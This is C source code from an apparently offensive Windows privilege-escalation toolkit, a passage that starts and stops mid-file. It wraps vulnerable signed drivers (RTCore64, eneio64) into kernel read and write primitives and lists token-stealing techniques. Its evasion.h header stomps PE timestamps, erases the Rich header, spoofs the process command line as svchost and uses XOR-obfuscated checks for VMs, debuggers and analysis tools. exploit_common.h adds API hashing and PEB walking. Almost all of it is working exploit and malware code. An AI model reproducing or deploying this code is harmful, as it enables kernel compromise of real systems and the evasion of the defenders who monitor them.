#include "exploit_common.h"
#include "syscalls.h"
#include <stdio.h>

#pragma pack(push, 1)
typedef struct _RTCORE64_MEMORY {
    BYTE    Unknown0[8];
    DWORD64 Address;
    BYTE    Unknown1[4];
    DWORD   Offset;
    DWORD   Size;
    DWORD   Value;
    BYTE    Unknown2[16];
} RTCORE64_MEMORY;
#pragma pack(pop)

#define RTCORE_IOCTL_READ  0x80002048
#define RTCORE_IOCTL_WRITE 0x8000204C

typedef struct _DRIVER_CAPABILITIES {
    BOOL requires_admin;
    BOOL supports_physical_memory;
    BOOL supports_kernel_memory;
    BOOL hvci_tolerant;
} DRIVER_CAPABILITIES;

typedef struct _DRIVER_ENTRY {
    DWORD  cve_id;
    WCHAR  name[64];
    WCHAR  device_name[64];
    DWORD  read_ioctl;
    DWORD  write_ioctl;
    DRIVER_CAPABILITIES caps;
    WCHAR  description[256];
} DRIVER_ENTRY;

static DRIVER_ENTRY g_driver_database[] = {
    {0x201916098, L"RTCore64", L"\\??\\RTCore64", 0x80002048, 0x8000204C,
     {TRUE, FALSE, TRUE, TRUE}, L"MSI Afterburner driver - arbitrary kernel R/W"},
    {0x202001246, L"eneio64", L"\\??\\GLCKIo", 0x80102040, 0x80102044,
     {FALSE, TRUE, FALSE, TRUE}, L"G.SKILL lighting driver - physical memory access"},
};

static DRIVER_ENTRY* FindDriverByName(const WCHAR* name) {
    for (int i = 0; i < sizeof(g_driver_database) / sizeof(g_driver_database[0]); i++) {
        if (wcscmp(g_driver_database[i].name, name) == 0) {
            return &g_driver_database[i];
        }
    }
    return NULL;
}

static BOOL OpenDriverDevice(DRIVER_ENTRY* driver, HANDLE* pHandle) {
    *pHandle = CreateFileW(driver->device_name,
                          GENERIC_READ | GENERIC_WRITE,
                          0, NULL, OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL, NULL);
    return (*pHandle != INVALID_HANDLE_VALUE);
}

static BOOL TryDriverFallbacks(DRIVER_ENTRY** p_driver, HANDLE* pHandle) {
    DRIVER_ENTRY* target_driver = *p_driver;

    for (int i = 0; i < sizeof(g_driver_database) / sizeof(g_driver_database[0]); i++) {
        if (&g_driver_database[i] == target_driver) continue;

        HANDLE hTest;
        if (OpenDriverDevice(&g_driver_database[i], &hTest)) {
            CloseHandle(hTest);
            *p_driver = &g_driver_database[i];
            return OpenDriverDevice(*p_driver, pHandle);
        }
    }
    return FALSE;
}

static BOOL RTCore64Read32(HANDLE hDevice, DWORD64 address, PDWORD outValue) {
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return FALSE;

    DWORD64 topBits = address & 0xFFFF800000000000ULL;
    if (topBits != 0xFFFF800000000000ULL) return FALSE;

    RTCORE64_MEMORY mem;
    memset(&mem, 0, sizeof(mem));
    mem.Address = address;
    mem.Offset = 0;
    mem.Size = 4;

    DWORD bytesReturned = 0;
    BOOL success = DeviceIoControl(hDevice, RTCORE_IOCTL_READ,
                                   &mem, sizeof(mem), &mem, sizeof(mem),
                                   &bytesReturned, NULL);

    if (success) {
        *outValue = mem.Value;
        return TRUE;
    }
    return FALSE;
}

static BOOL RTCore64Write32(HANDLE hDevice, DWORD64 address, DWORD value) {
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return FALSE;
    if ((address & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) return FALSE;

    RTCORE64_MEMORY mem = {0};
    mem.Address = address;
    mem.Offset = 0;
    mem.Size = 4;
    mem.Value = value;

    DWORD bytesReturned = 0;
    return DeviceIoControl(hDevice, RTCORE_IOCTL_WRITE,
                          &mem, sizeof(mem), &mem, sizeof(mem),
                          &bytesReturned, NULL);
}

static BOOL RTCore64Read64(HANDLE hDevice, DWORD64 address, PDWORD64 outValue) {
    if (address == 0 || address == (DWORD64)-1) return FALSE;
    if (address > 0xFFFFFFFFFFFFFFFBULL) return FALSE;

    DWORD low = 0, high = 0;
    if (!RTCore64Read32(hDevice, address, &low)) return FALSE;
    if (!RTCore64Read32(hDevice, address + 4, &high)) return FALSE;

    *outValue = ((DWORD64)high << 32) | low;
    return TRUE;
}

static BOOL RTCore64Write64(HANDLE hDevice, DWORD64 address, DWORD64 value) {
    DWORD low = (DWORD)(value & 0xFFFFFFFF);
    DWORD high = (DWORD)((value >> 32) & 0xFFFFFFFF);

    if (!RTCore64Write32(hDevice, address, low)) return FALSE;
    if (!RTCore64Write32(hDevice, address + 4, high)) return FALSE;
    return TRUE;
}

// Macro to eliminate boilerplate in exploits using a global RTCore64 handle
#define IMPLEMENT_RTCORE64_PRIMITIVES(HandleVar) \
    BOOL KernelRead32(DWORD64 address, PDWORD outValue) { \
        return RTCore64Read32(HandleVar, address, outValue); \
    } \
    BOOL KernelWrite32(DWORD64 address, DWORD value) { \
        return RTCore64Write32(HandleVar, address, value); \
    } \
    BOOL KernelRead64(DWORD64 address, PDWORD64 outValue) { \
        return RTCore64Read64(HandleVar, address, outValue); \
    } \
    BOOL KernelWrite64(DWORD64 address, DWORD64 value) { \
        return RTCore64Write64(HandleVar, address, value); \
    }


static BOOL VehRTCore64Read32(HANDLE hDevice, DWORD64 address, PDWORD outValue) {
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return FALSE;

    DWORD64 topBits = address & 0xFFFF800000000000ULL;
    if (topBits != 0xFFFF800000000000ULL) return FALSE;

    RTCORE64_MEMORY mem;
    memset(&mem, 0, sizeof(mem));
    mem.Address = address;
    mem.Offset = 0;
    mem.Size = 4;

    IO_STATUS_BLOCK ioStatusBlock = {0};

    NTSTATUS status = pVehNtDeviceIoControlFile(
        hDevice, NULL, NULL, NULL, &ioStatusBlock,
        RTCORE_IOCTL_READ, &mem, sizeof(mem), &mem, sizeof(mem)
    );

    if (NT_SUCCESS(status)) {
        *outValue = mem.Value;
        return TRUE;
    }
    return FALSE;
}

static BOOL VehRTCore64Write32(HANDLE hDevice, DWORD64 address, DWORD value) {
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return FALSE;
    if ((address & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) return FALSE;

    RTCORE64_MEMORY mem = {0};
    mem.Address = address;
    mem.Offset = 0;
    mem.Size = 4;
    mem.Value = value;

    IO_STATUS_BLOCK ioStatusBlock = {0};

    NTSTATUS status = pVehNtDeviceIoControlFile(
        hDevice, NULL, NULL, NULL, &ioStatusBlock,
        RTCORE_IOCTL_WRITE, &mem, sizeof(mem), &mem, sizeof(mem)
    );

    return NT_SUCCESS(status);
}

static BOOL VehRTCore64Read64(HANDLE hDevice, DWORD64 address, PDWORD64 outValue) {
    if (address == 0 || address == (DWORD64)-1) return FALSE;
    if (address > 0xFFFFFFFFFFFFFFFBULL) return FALSE;

    DWORD low = 0, high = 0;
    if (!VehRTCore64Read32(hDevice, address, &low)) return FALSE;
    if (!VehRTCore64Read32(hDevice, address + 4, &high)) return FALSE;

    *outValue = ((DWORD64)high << 32) | low;
    return TRUE;
}

static BOOL VehRTCore64Write64(HANDLE hDevice, DWORD64 address, DWORD64 value) {
    DWORD low = (DWORD)(value & 0xFFFFFFFF);
    DWORD high = (DWORD)((value >> 32) & 0xFFFFFFFF);

    if (!VehRTCore64Write32(hDevice, address, low)) return FALSE;
    if (!VehRTCore64Write32(hDevice, address + 4, high)) return FALSE;
    return TRUE;
}

#define IMPLEMENT_VEH_RTCORE64_PRIMITIVES(HandleVar) \
    BOOL KernelRead32(DWORD64 address, PDWORD outValue) { return VehRTCore64Read32(HandleVar, address, outValue); } \
    BOOL KernelWrite32(DWORD64 address, DWORD value) { return VehRTCore64Write32(HandleVar, address, value); } \
    BOOL KernelRead64(DWORD64 address, PDWORD64 outValue) { return VehRTCore64Read64(HandleVar, address, outValue); } \
    BOOL KernelWrite64(DWORD64 address, DWORD64 value) { return VehRTCore64Write64(HandleVar, address, value); }

static BOOL TestKernelReadWrite(DWORD64 kernelBase, HANDLE hDevice, BOOL useVeh) {
    DWORD mzHeader = 0;
    BOOL success;

    if (useVeh) {
        success = VehRTCore64Read32(hDevice, kernelBase, &mzHeader);
    } else {
        success = RTCore64Read32(hDevice, kernelBase, &mzHeader);
    }

    if (!success) return FALSE;
    return ((mzHeader & 0xFFFF) == 0x5A4D);
}

#endif // DRIVER_INFO_H
```

#### evasion.h

```c
// headers\evasion.h
#ifndef EVASION_H
#define EVASION_H

#include "exploit_common.h"
#include <psapi.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <time.h>

#define SLEEP_JITTER_MS 500

#pragma section(".rsrc2", read)
__declspec(allocate(".rsrc2")) static const char g_benignStrings[] =
    "Microsoft Visual C++ Runtime Library\0"
    "This application has requested the Runtime to terminate it.\0"
    "Copyright (C) Microsoft Corporation. All rights reserved.\0"
    "Windows System Configuration Utility\0"
    "Version 10.0.26100.0\0"
    "Operating System Compatibility Module\0"
    "System Resource Monitor Service\0"
    "Hardware Abstraction Layer Interface\0"
    "Device Configuration Manager\0"
    "Performance Data Helper\0"
    "Windows Management Instrumentation Provider\0";

static void StompPETimestamp(void) {
    HMODULE hSelf = GetModuleHandleA(NULL);
    if (!hSelf) return;

    __try {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hSelf;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hSelf + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return;

        DWORD oldProtect;
        PVOID target = &nt->FileHeader.TimeDateStamp;
        SIZE_T size = sizeof(DWORD) * 2 + 0x40;  // Cover timestamp region
        if (VirtualProtect(target, size, PAGE_READWRITE, &oldProtect)) {
            nt->FileHeader.TimeDateStamp = 0x5FC12A00 + (rand() % 0x1000000);  // Random plausible date
            nt->OptionalHeader.CheckSum = 0;
            VirtualProtect(target, size, oldProtect, &oldProtect);
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {}
}

static void EraseRichHeader(void) {
    HMODULE hSelf = GetModuleHandleA(NULL);
    if (!hSelf) return;

    __try {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hSelf;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

        BYTE* base = (BYTE*)hSelf;
        DWORD peOffset = dos->e_lfanew;

        for (DWORD i = peOffset - 4; i > sizeof(IMAGE_DOS_HEADER); i -= 4) {
            if (*(DWORD*)(base + i) == 0x68636952) {  // "Rich"
                DWORD richEnd = i + 8;  // Include Rich + checksum
                DWORD stubEnd = sizeof(IMAGE_DOS_HEADER);

                DWORD oldProtect;
                SIZE_T regionSize = richEnd - stubEnd;
                if (VirtualProtect(base + stubEnd, regionSize, PAGE_READWRITE, &oldProtect)) {
                    memset(base + stubEnd, 0x0E, regionSize);
                    VirtualProtect(base + stubEnd, regionSize, oldProtect, &oldProtect);
                }
                break;
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {}
}

static void AddBenignImports(void) {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    HMODULE hShell32 = LoadLibraryA("shell32.dll");
    HMODULE hGdi32 = LoadLibraryA("gdi32.dll");
    HMODULE hOle32 = LoadLibraryA("ole32.dll");

    if (hUser32) {
        typedef int (WINAPI *pGetSystemMetrics)(int);
        pGetSystemMetrics fn = (pGetSystemMetrics)GetProcAddress(hUser32, "GetSystemMetrics");
        if (fn) {
            volatile int x = fn(0);  // SM_CXSCREEN
            (void)x;
        }
    }

    if (hOle32) {
        typedef HRESULT (WINAPI *pCoInitializeEx)(LPVOID, DWORD);
        pCoInitializeEx fn = (pCoInitializeEx)GetProcAddress(hOle32, "CoInitializeEx");
        if (fn) {
            fn(NULL, 0x2);
        }
    }
    OSVERSIONINFOW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExW(&osvi);
}

static void SpoofProcessName(void) {
    __try {
        PPEB peb;
#ifdef _WIN64
        peb = (PPEB)__readgsqword(0x60);
#else
        peb = (PPEB)__readfsdword(0x30);
#endif
        typedef struct _RTL_USER_PROCESS_PARAMETERS_PARTIAL {
            BYTE Reserved1[16];
            PVOID Reserved2[10];
            UNICODE_STRING ImagePathName;
            UNICODE_STRING CommandLine;
        } RTL_USER_PROCESS_PARAMETERS_PARTIAL;

        RTL_USER_PROCESS_PARAMETERS_PARTIAL* params =
            *(RTL_USER_PROCESS_PARAMETERS_PARTIAL**)((BYTE*)peb + 0x20);
        if (!params) return;

        static WCHAR fakeCmd[] = L"C:\\Windows\\System32\\svchost.exe -k netsvcs -p";
        params->CommandLine.Buffer = fakeCmd;
        params->CommandLine.Length = (USHORT)(wcslen(fakeCmd) * sizeof(WCHAR));
        params->CommandLine.MaximumLength = params->CommandLine.Length + sizeof(WCHAR);
    } __except(EXCEPTION_EXECUTE_HANDLER) {}
}

static void InitializeAntiStaticDetection(void) {
    StompPETimestamp();
    EraseRichHeader();
    AddBenignImports();
    SpoofProcessName();
}

static void SleepJitter(DWORD baseMs) {
    DWORD jitter = (rand() % SLEEP_JITTER_MS);
    Sleep(baseMs + jitter);
}

static BOOL CheckTimingAttack() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    volatile int x = 0;
    for (int i = 0; i < 100; i++) x++;

    QueryPerformanceCounter(&end);

    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    return (elapsed > 0.001);
}

static BOOL DetectVM() {
    HKEY hKey;
    char vmKeys[][80] = {
        {0x32,0x38,0x32,0x33,0x24,0x2C,0x5d,0x22,0x34,0x31,0x31,0x26,0x2d,0x33,0x22,0x2e,0x2d,0x33,0x31,0x2e,0x32,0x26,0x33,0x5d,0x32,0x26,0x31,0x35,0x28,0x24,0x26,0x32,0x5d,0x35,0x23,0x2e,0x38,0x28,0x34,0x26,0x32,0x33,0},
        {0x32,0x38,0x32,0x33,0x24,0x2C,0x5d,0x22,0x34,0x31,0x31,0x26,0x2d,0x33,0x22,0x2e,0x2d,0x33,0x31,0x2e,0x32,0x26,0x33,0x5d,0x32,0x26,0x31,0x35,0x28,0x24,0x26,0x32,0x5d,0x35,0x23,0x2e,0x38,0x2C,0x2e,0x34,0x32,0x26,0},
        {0x32,0x38,0x32,0x33,0x24,0x2C,0x5d,0x22,0x34,0x31,0x31,0x26,0x2d,0x33,0x22,0x2e,0x2d,0x33,0x31,0x2e,0x32,0x26,0x33,0x5d,0x32,0x26,0x31,0x35,0x28,0x24,0x26,0x32,0x5d,0x35,0x23,0x2e,0x38,0x32,0x26,0x31,0x35,0x28,0x24,0x26,0},
        {0x32,0x38,0x32,0x33,0x24,0x2C,0x5d,0x22,0x34,0x31,0x31,0x26,0x2d,0x33,0x22,0x2e,0x2d,0x33,0x31,0x2e,0x32,0x26,0x33,0x5d,0x32,0x26,0x31,0x35,0x28,0x24,0x26,0x32,0x5d,0x35,0x2c,0x24,0x28,0},
        {0x32,0x38,0x32,0x33,0x24,0x2C,0x5d,0x22,0x34,0x31,0x31,0x26,0x2d,0x33,0x22,0x2e,0x2d,0x33,0x31,0x2e,0x32,0x26,0x33,0x5d,0x32,0x26,0x31,0x35,0x28,0x24,0x26,0x32,0x5d,0x35,0x2c,0x2c,0x2e,0x34,0x32,0x26,0}
    };

    for (int i = 0; i < sizeof(vmKeys) / sizeof(vmKeys[0]); i++) {
        char decrypted[80];
        for (int j = 0; vmKeys[i][j] != 0; j++) {
            decrypted[j] = vmKeys[i][j] ^ 0x41;
        }
        decrypted[strlen(vmKeys[i])] = 0;

        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, decrypted, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return TRUE;
        }
    }

    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) return TRUE;

    return FALSE;
}

static BOOL IsBeingDebugged() {
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    if (peb->BeingDebugged) return TRUE;
    if (*(PDWORD)((PBYTE)peb + 0xBC) & 0x70) return TRUE;

    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    if (isDebuggerPresent) return TRUE;

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return TRUE;
    }

    if (CheckTimingAttack()) return TRUE;

    return FALSE;
}

static BOOL DetectAnalysisTools() {
    wchar_t enc_tools[][32] = {
        {0x2D,0x2E,0x2E,0x39,0x24,0x20,0x22,0x64,0x26,0x38,0x26,0},
        {0x3A,0x18,0x10,0x24,0x20,0x22,0x64,0x26,0x38,0x26,0},
        {0x35,0x2B,0x2F,0x24,0x20,0x22,0x64,0x26,0x38,0x26,0},
        {0x2B,0x24,0x20,0x64,0x26,0x38,0x26,0},
        {0x2B,0x24,0x20,0x18,0x10,0x64,0x26,0x38,0x26,0},
        {0x2B,0x24,0x20,0x21,0x64,0x26,0x38,0x26,0},
        {0x2B,0x24,0x20,0x21,0x18,0x10,0x64,0x26,0x38,0x26,0},
        {0x35,0x2B,0x30,0x26,0x31,0x2C,0x20,0x30,0x2E,0x64,0x26,0x38,0x26,0},
        {0x32,0x30,0x2D,0x24,0x2B,0x2D,0x2F,0x64,0x26,0x38,0x26,0},
        {0x32,0x30,0x2D,0x24,0x26,0x38,0x32,0x64,0x26,0x38,0x26,0},
        {0x32,0x30,0x2D,0x24,0x26,0x31,0x31,0x2C,0x20,0x24,0x2E,0x26,0x30,0x64,0x26,0x38,0x26,0},
        {0x24,0x2B,0x24,0x24,0x2E,0x26,0x30,0x64,0x26,0x38,0x26,0},
        {0x20,0x23,0x30,0x32,0x31,0x23,0x2B,0x22,0x26,0x64,0x26,0x38,0x26,0},
        {0x2B,0x2F,0x2F,0x23,0x2F,0x2B,0x22,0x39,0x24,0x26,0x20,0x23,0x22,0x22,0x26,0x30,0x64,0x26,0x38,0x26,0}
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            for (size_t i = 0; i < sizeof(enc_tools) / sizeof(enc_tools[0]); i++) {
                wchar_t decrypted[32];
                int j;
                for (j = 0; enc_tools[i][j] != 0 && j < 31; j++) {
                    decrypted[j] = enc_tools[i][j] ^ 0x42;
                }
                decrypted[j] = 0;

                if (_wcsicmp(pe32.szExeFile, decrypted) == 0) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return FALSE;
}

static BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID adminGroup;

    if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    return isAdmin;
}

static BOOL PerformAntiAnalysisChecks() {
    int checks[4] = {0, 1, 2, 3};

    for (int i = 3; i > 0; i--) {
        int j = rand() % (i + 1);
        int temp = checks[i];
        checks[i] = checks[j];
        checks[j] = temp;
    }

    for (int i = 0; i < 4; i++) {
        SleepJitter(50 + (rand() % 150));

        switch(checks[i]) {
            case 0:
                if (IsBeingDebugged()) return FALSE;
                break;
            case 1:
                if (DetectAnalysisTools()) return FALSE;
                break;
            case 2:
                if (DetectVM()) return FALSE;
                break;
            case 3:
                if (!IsRunningAsAdmin()) return FALSE;
                break;
        }
    }

    return TRUE;
}

#endif // EVASION_H
```

#### exploit_common.h

```c
// headers\exploit_common.h
#ifndef EXPLOIT_COMMON_H
#define EXPLOIT_COMMON_H

#include <windows.h>
#include <winternl.h>
#include <intrin.h>

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define XOR_KEY 0xAB
#define ROL(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
#define ROR(x, n) (((x) >> (n)) | ((x) << (32 - (n))))

#define MIN_KERNEL_SIZE             0x400000ULL
#define MAX_KERNEL_SIZE             0x2000000ULL
#define KERNEL_SCAN_ALIGNMENT       0x200000ULL
#define KERNEL_SCAN_FAST_ALIGNMENT  0x1000000ULL
#define KERNEL_POINTER_MASK         0xFFFF000000000000ULL

typedef struct _LDR_DATA_TABLE_ENTRY_CUSTOM {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
} LDR_DATA_TABLE_ENTRY_CUSTOM, *PLDR_DATA_TABLE_ENTRY_CUSTOM;

typedef struct _SYSCALL_ENTRY {
    DWORD ssn;
    PVOID syscallAddr;
    BOOL resolved;
} SYSCALL_ENTRY;

typedef struct _KERNEL_OFFSETS {
    DWORD EprocessToken;
    DWORD EprocessUniqueProcessId;
    DWORD EprocessActiveProcessLinks;
    DWORD EprocessImageFileName;
    DWORD EprocessDirectoryTableBase; // DTB for V2P, always 0x28
    DWORD KthreadPreviousMode;
    DWORD TokenPrivileges;
    DWORD TokenUserAndGroups;
    DWORD TokenDefaultDacl;
    BOOL  DynamicallyResolved;
} KERNEL_OFFSETS, *PKERNEL_OFFSETS;

typedef enum _LPE_TECHNIQUE {
    TECHNIQUE_TOKEN_STEALING = 1,
    TECHNIQUE_ACL_EDITING = 2,
    TECHNIQUE_PRIVILEGE_MANIPULATION = 3
} LPE_TECHNIQUE;

// API hashing
static DWORD HashAPI(const char *str) {
    DWORD hash = 0x811C9DC5;
    int c;
    while ((c = *str++)) {
        hash ^= c;
        hash *= 0x01000193;
        hash = ROL(hash, 13);
    }
    return hash;
}

static PVOID ResolveAPI(HMODULE hModule, DWORD hash) {
    if (!hModule) return NULL;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hModule +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD names = (PDWORD)((PBYTE)hModule + exports->AddressOfNames);
    PDWORD functions = (PDWORD)((PBYTE)hModule + exports->AddressOfFunctions);
    PWORD ordinals = (PWORD)((PBYTE)hModule + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char *name = (const char *)((PBYTE)hModule + names[i]);
        if (HashAPI(name) == hash) return (PVOID)((PBYTE)hModule + functions[ordinals[i]]);
    }
    return NULL;
}

static HMODULE GetNtdllHandleFromPEB() {
    PPEB peb;
#ifdef _WIN64
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif

    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    const WCHAR target[] = L"ntdll.dll";
    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY_CUSTOM entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY_CUSTOM, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer && entry->BaseDllName.Length == 18) {
            BOOL match = TRUE;
            for (int i = 0; i < 9; i++) {
                WCHAR c = entry->BaseDllName.Buffer[i];
                if (c >= L'A' && c <= L'Z') c += 0x20;
                WCHAR t = target[i];
                if (t >= L'A' && t <= L'Z') t += 0x20;
                if (c != t) { match = FALSE; break; }
            }
            if (match) {
                return (HMODULE)entry->DllBase;
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

static DWORD HashModuleW(const WCHAR *str, USHORT len) {
    DWORD hash = 0;
    for (USHORT i = 0; i < len / sizeof(WCHAR); i++) {
        WCHAR c = str[i];
        if (c >= L'a' && c <= L'z') c -= 0x20;
        hash = _rotr(hash, 13) + (DWORD)c;
    }
    return hash;
}

static HMODULE GetModuleByHash(DWORD hash) {
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY inLoadOrder = peb->Ldr->InMemoryOrderModuleList.Flink;
    PLIST_ENTRY current = inLoadOrder;

    do {
        PLDR_DATA_TABLE_ENTRY_CUSTOM entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_CUSTOM, InMemoryOrderLinks);
        if (entry->FullDllName.Buffer) {
            DWORD currentHash = HashModuleW(entry->FullDllName.Buffer, entry->FullDllName.Length);
            if (currentHash == hash) return (HMODULE)entry->DllBase;
        }
        current = current->Flink;
    } while (current != inLoadOrder);
    return NULL;
}

static BOOL GetTextSection(HMODULE hMod, PBYTE *start, DWORD *size) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            *start = (PBYTE)hMod + sec[i].VirtualAddress;
            *size  = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

static DWORD64 g_cfgBitmapBase = 0;
static DWORD   g_cfgBitmapSize = 0;
static PDWORD  g_cfgBitmap = NULL;
static BOOL    g_cfgInitialized = FALSE;
static BOOL    g_cfgAvailable = FALSE;

static BOOL IsCFGEnabledForModule(HMODULE hMod) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
   if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    DWORD loadConfigRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
    if (!loadConfigRVA) return FALSE;

    PIMAGE_LOAD_CONFIG_DIRECTORY64 loadConfig = (PIMAGE_LOAD_CONFIG_DIRECTORY64)((PBYTE)hMod + loadConfigRVA);
    if (loadConfig->Size < 0x70) return FALSE;

    DWORD guardFlags = loadConfig->GuardFlags;
    return (guardFlags & 0x100) != 0;
}

static BOOL ExtractCFGBitmap(HMODULE hMod) {
    g_cfgInitialized = TRUE;
    g_cfgAvailable = FALSE;
    g_cfgBitmapBase = 0;
    g_cfgBitmapSize = 0;
    g_cfgBitmap = NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    DWORD loadConfigRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
    if (!loadConfigRVA) {
        return FALSE;
    }

    PIMAGE_LOAD_CONFIG_DIRECTORY64 loadConfig =
        (PIMAGE_LOAD_CONFIG_DIRECTORY64)((PBYTE)hMod + loadConfigRVA);

    if (loadConfig->Size < 0x70) {
        return FALSE;
    }

    if (!IsCFGEnabledForModule(hMod)) {
        return FALSE;
    }

    g_cfgBitmapBase = loadConfig->GuardCFFunctionTable;
    g_cfgBitmapSize = loadConfig->GuardCFFunctionCount;

    if (g_cfgBitmapBase && g_cfgBitmapSize > 0) {
        g_cfgBitmap = (PDWORD)g_cfgBitmapBase;
        g_cfgAvailable = TRUE;
        return TRUE;
    }

    return FALSE;
}

static BOOL IsCFGBitmapAvailable() {
    return g_cfgAvailable && g_cfgBitmap != NULL && g_cfgBitmapSize > 0;
}

static BOOL IsCFGValid(DWORD64 address, HMODULE hMod) {
    if (!g_cfgAvailable || !g_cfgBitmap || !g_cfgBitmapSize || !hMod) {
        return FALSE;
    }

    DWORD targetRva = (DWORD)(address - (DWORD64)hMod);

    DWORD left = 0;
    DWORD right = g_cfgBitmapSize - 1;

    while (left <= right) {
        DWORD mid = (left + right) / 2;
        DWORD entry = g_cfgBitmap[mid];
        DWORD rva = entry & ~0xFF;  // Lower 8 bits contain flags

        if (rva == targetRva) {
            return TRUE;
        } else if (rva < targetRva) {
            left = mid + 1;
        } else {
            if (mid == 0) break;
            right = mid - 1;
        }
    }

